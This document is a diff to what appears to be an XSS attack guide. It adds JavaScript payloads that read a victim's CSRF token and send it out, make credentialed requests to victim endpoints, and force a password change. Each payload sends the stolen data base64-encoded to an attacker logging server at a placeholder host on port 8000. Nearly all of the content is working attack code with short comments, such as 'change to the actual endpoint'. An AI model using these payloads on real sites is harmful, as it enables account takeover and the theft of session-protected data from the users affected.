@@ -224,6 +224,7 @@ Here, you need to find the variable name for the 🐱 token 🐱 you want to exf
 
 ```
 <script>
+// retrieve the CSRF token.
 var xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://🌙/index.php', false);
 xhr.withCredentials = true;
@@ -238,8 +239,19 @@ var logXhr = new XMLHttpRequest();
 logXhr.open('GET', 'http://⭐:8000/log?data=' + Tokenstealer, true);
 logXhr.send();
 
+// Make a request to the victim server and send the output back to your logging server
+var victimRequest = new XMLHttpRequest();
+victimRequest.open('GET', 'https://🌙/some_endpoint', true); // Change to the actual endpoint you want to request
+victimRequest.withCredentials = true;
+victimRequest.onload = function() {
+    // Send the response back to your logging server
+    var responseOutput = btoa(victimRequest.responseText); // Base64 encode the response
+    var responseLogXhr = new XMLHttpRequest();
+    responseLogXhr.open('GET', 'http://⭐:8000/log?data=' + responseOutput, true);
+    responseLogXhr.send();
+};
+victimRequest.send();
 </script>
-
 
 ```
 
@@ -282,24 +294,32 @@ if __name__ == '__main__':
 
 ##🌙 Victim
 
-Here, you need to find the variable name for the 🐱 token 🐱 you want to exfiltrate!
+You need to know what parameters the form needs filled, and then you can harvest those parameters with the first get request!
 
 ```
 <script>
+// Step 1: Get CSRF token
 var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://🌙/index.php', false);
+xhr.open('GET', '🌙/home.php', false);  // Fetch the page to get the CSRF token
 xhr.withCredentials = true;
 xhr.send();
 
 var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
-var TokenB64 = doc.getElementById('🐱 token 🐱').value;
-var Tokenstealer = btoa(TokenB64);  // Base64 encode the token
+var csrftoken = encodeURIComponent(doc.getElementById('🐱 token 🐱').value);  // Extract and encode CSRF token
 
-// Send the CSRF token to your logging server
-var logXhr = new XMLHttpRequest();
-logXhr.open('GET', 'http://⭐:8000/log?data=' + Tokenstealer, true);
-logXhr.send();
+// Step 2: Change Password
+var csrf_req = new XMLHttpRequest();
+var params = `FORM FILLEDd&csrf_token=${csrftoken}`; // Prepare parameters for the POST request
+csrf_req.open('POST', '/home.php', false);  // Specify the same endpoint for the POST request
+csrf_req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); // Set the content type
+csrf_req.withCredentials = true;  // Include credentials (cookies)
+csrf_req.send(params);  // Send the request with parameters
 
+// Step 3: Log the response to the logging server
+var logResponseXhr = new XMLHttpRequest();
+var responseData = btoa(csrf_req.responseText); // Base64 encode the response
+logResponseXhr.open('GET', 'http://⭐:8000/log?data=' + responseData, true); // Replace ⭐ with your logging server address
+logResponseXhr.send();
 </script>
 
 
